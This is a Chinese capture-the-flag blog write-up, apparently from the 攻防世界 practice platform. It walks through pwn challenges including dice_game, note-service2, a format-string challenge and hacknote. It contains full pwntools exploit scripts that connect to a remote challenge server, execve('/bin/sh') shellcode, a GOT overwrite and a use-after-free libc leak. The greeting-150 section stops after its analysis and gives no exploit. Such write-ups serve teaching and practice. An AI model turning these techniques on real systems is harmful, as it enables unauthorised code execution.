<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *  <span class="comment"># 提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">59063</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line"><span class="comment">#覆盖seed值为0</span></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;point(1~6): &quot;</span>)</span><br><span class="line">    <span class="comment">#混合编程，调用c的rand函数，rand的缺省时默认种子参数是0</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/posts/5600bec/image-20201123095347070.png" alt="image-20201123095347070"></p>
<h2 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223112703.png"></p>
<h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>惯例先checksec一下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223457054.png" alt="image-20201123223457054"></p>
<p>然后使用ida反编译。一边阅读一边修改函数名称，将整个过程走一遍。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223736816.png" alt="image-20201123223736816"></p>
<p>其中只实现了add和delete。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223844741.png" alt="image-20201123223844741"></p>
<p>在add函数中，没有对index进行检查，因此可以通过输入index值基本实现将任意指针写到globle数组中。同时申请的chunk大小不能超过8字节，小于64位下chunk的最小值，实际分配的chunk每个用户数据大小是16字节（0x10）还有chunk头16字节。</p>
<p>对于获取输入的函数也有需要注意的地方：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224225947.png" alt="image-20201123224225947"></p>
<p>关于delete函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224310040.png" alt="image-20201123224310040"></p>
<h3 id="思路及利用-2"><a href="#思路及利用-2" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先值得注意的漏洞有两个，一个是数组的越界，一个是释放chunk后没有将指针置为null。但是由于题目限制了对chunk的写入数据大小，没法做到溢出，因此关于堆的攻击技巧基本上都不能用。</p>
<p>目标转为数组越界，同时注意到这道题目是堆栈可执行的。那么就可以考虑，将shellcode写入堆，利用数组越界将堆指针替换为got表项，更改相应函数的执行内容。结合下文出现的参数传递问题，选择free函数是比较合适的。</p>
<p>但是每一个chunk输入最多为7字节，只能将shellcode分散，利用jmp指令跳转。</p>
<p>关于shellcode的编写。选择系统调用execve(“/bin/sh”,0,0)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov rdi, xxx   <span class="comment">//xxx=&amp;(&quot;/bin/sh&quot;)  </span></span><br><span class="line">mov rsi,<span class="number">0</span>   </span><br><span class="line">mov rax, <span class="number">0x3b</span> <span class="comment">//rax=0x3b execve在64位下的系统调用号</span></span><br><span class="line">mov rdx,<span class="number">0</span>   </span><br><span class="line">syscall </span><br></pre></td></tr></table></figure>

<p>但是<code>mov rsi,0</code>太长，因此换为<code>xor rsi, rsi </code>利用异或实现。同理<code>mov rdx,0 </code>也是。</p>
<p>这里又出现个问题就是，‘/bin/sh’太长，不能直接传递。需要利用函数的参数传递，首先将‘/bin/sh’写入一个chunk，然后free。这时候根据64位的参数传递规则，‘/bin/sh’作为free的参数传递给了rdi。</p>
<p>接下来需要解决的是在不同chunk间的跳转。使用jmp short(\xeb)实现短转移。需要知道之间的相对偏移。</p>
<p>上文分析过每个chunk依次申请，大小一致都是0x20.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231022120.png" alt="image-20201123231022120"></p>
<p>chunk的状态如图所示，为了统一。将jmp指令放在最后，所需的指令与jmp之间用nop填充（\x90）。那么即从当前chunk的jmp区跳到下一个chunk的data区，距离是8+8+8+1 = 0x19.即跳转指令<code>\xeb\x19</code>。</p>
<p>最后就是得到free的got表项的地址相对于global的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084832598.png" alt="image-20201125084832598"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084904525.png" alt="image-20201125084904525"></p>
<p>偏移为<code>(0x0000000000202018-0x0000000002020A0)/8</code>得到-17.</p>
<p>所以得到exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note-service2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">42169</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">add(<span class="number">-17</span>,asm(<span class="string">&quot;xor rsi,rsi&quot;</span>)+<span class="string">b&#x27;\x90\x90\xeb\x19&#x27;</span> )</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">&quot;mov eax,0x3b&quot;</span>)+<span class="string">b&quot;\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">&quot;xor rdx,rdx&quot;</span>)+<span class="string">b&quot;\x90\x90\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">&quot;syscall&quot;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231554223.png" alt="image-20201123231554223"></p>
<h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083325372.png" alt="image-20201125083325372"></p>
<p>checksec:</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083521011.png" alt="image-20201125083521011"></p>
<h3 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083728103.png" alt="image-20201125083728103"></p>
<p>显然目标就是将key的值改为35795746，也就是0x02223322。这里有用到ida一个技巧，ida里字符串是以编码的值存储的，找到对应的值，选中，按下a就可以转为字符串显示。这里的”The location of key is %08x, and its value is %08x,not the 0x02223322. (╯°Д°)╯︵ ┻━┻\n”就是这样得来的。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084015380.png" alt="image-20201125084015380"></p>
<p>这显然是一个格式化字符串漏洞。</p>
<h3 id="思路及利用-3"><a href="#思路及利用-3" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述分析，只需要输入一个格式化字符串，将&amp;key改为0x02223322就可以。</p>
<p>那么首先，寻找格式化字符串的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084321047.png" alt="image-20201125084321047"></p>
<p>可以看到偏移为12.</p>
<p>使用ida查询key的地址</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084627078.png" alt="image-20201125084627078"></p>
<p>然后借助fmtstr_payload快速构造格式化字符串。<code>fmtstr_payload(12,&#123;0x804A048:0x02223322&#125;)</code></p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./实时数据监测&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52658</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>,&#123;<span class="number">0x804A048</span>:<span class="number">0x02223322</span>&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084651226.png" alt="image-20201125084651226"></p>
<h2 id="greeting-150"><a href="#greeting-150" class="headerlink" title="greeting-150"></a>greeting-150</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094546610.png" alt="image-20201125094546610"></p>
<p>首先checksec</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201204833485.png" alt="image-20201201204833485"></p>
<h3 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201205229762.png" alt="image-20201201205229762"></p>
<p>显然这里存在的是格式化字符串漏洞。</p>
<p>sprintf函数的作用是，将v5的内容按照format拼接到“Nice to meet you,%s：）”中。要利用这个格式化字符串漏洞，首先需要找到偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094520178.png" alt="image-20201125094520178"></p>
<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211551807.png" alt="image-20201201211551807"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213201788.png" alt="image-20201201213201788"></p>
<h3 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h3><p>主函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213310802.png" alt="image-20201201213310802"></p>
<p>删除堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213328651.png" alt="image-20201201213328651"></p>
<p>输出堆的内容：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213346639.png" alt="image-20201201213346639"></p>
<p>添加堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213401902.png" alt="image-20201201213401902"></p>
<p>自定义的输出函数</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213619289.png" alt="image-20201201213619289"></p>
<p>整个程序分析下来，流程大概是，有一个指针数组ptr。每次新建的时候，ptr申请一个起控制作用的0x8大小的堆（control_chunk），这个堆首先放入自定义的一个输出函数put，然后再指向相应的申请的size大小的存放内容的堆(data_chunk)。在删除时，并没用将指针置null，这里就有UAF漏洞。</p>
<p>而print函数中的<code>(*ptr[v1])(ptr[v1]);</code>实际上就是调用*ptr[v1]的函数，ptr[v1]作为函数的参数。正常情况下，是输出ptr[v1+4]指向的内容，即输入的数据。</p>
<p>用图来说明关系：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214918029.png" alt="image-20201201214918029"></p>
<h3 id="思路及利用-4"><a href="#思路及利用-4" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述的分析，显然这道题主要是利用UAF。control_chunk的大小是0x8，释放后会在fastbin中，利用fastbin的特性就可以再申请大小0x8的chunk，对释放的chunk进行写操作。</p>
<p>也就是说，申请两个超过fastbin大小的chunk，然后释放。再申请0x8大小的chunk，这时候就可以向control_chunk进行写操作来执行需要的函数。（这里申请两个超过fastbin大小的chunk，是因为申请0x8的data_chunk还需要一个0x8的control_chunk，而且需要注意fastbin是采用单向链表维护，并且遵循<strong>后进先出</strong>的规则） </p>
<p>首先，需要泄露libc的基地址，这里可以利用自定义的put函数，输出got表项。这里选择free函数。</p>
<p>得到基地址后，只需要将control_chunk的fd改为system的地址，然后再写入参数‘sh’即可。这里有一点需要注意的是，执行``(*ptr[v1])(ptr[v1])`时，相当于system（&amp;systemsh）显然是不能正确执行的。需要用一点小技巧，改为system（&amp;system||sh）。</p>
<p>图片演示过程：</p>
<ul>
<li>申请两个chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201222619001.png" alt="image-20201201222619001"></p>
<ul>
<li>依次删除0、1后再申请0x8的chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223133135.png" alt="image-20201201223133135"></p>
<p><strong>这时候就可以通过ptr[2]向control_chunk0写入数据。</strong></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">30500</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">free_got= elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">put = <span class="number">0x804862b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(put)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libcbase=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">payload = p32(system)+<span class="string">b&#x27;||sh&#x27;</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223434405.png" alt="image-20201201223434405"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>-攻防世界</tag>
      </tags>
  </entry>
</search>
